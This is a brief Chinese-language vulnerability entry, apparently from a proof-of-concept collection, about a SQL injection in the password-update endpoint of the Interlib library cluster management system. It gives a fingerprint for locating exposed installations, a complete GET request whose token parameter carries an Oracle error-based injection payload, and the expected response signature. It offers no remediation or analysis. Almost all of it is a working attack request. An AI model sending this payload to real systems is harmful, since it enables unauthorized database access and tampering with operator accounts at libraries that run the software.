# 图书馆集群管理系统interlibupdOpuserPwSQL注入漏洞

图书馆集群管理系统interlibupdOpuserPw ｜ SQL注入 ｜ —
- **指纹**：`body="interlib/common/"`
- **请求**：`GET /interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(999999,1928)%20from%20dual))=%272 HTTP/1.1`
- **响应特征**：200 1295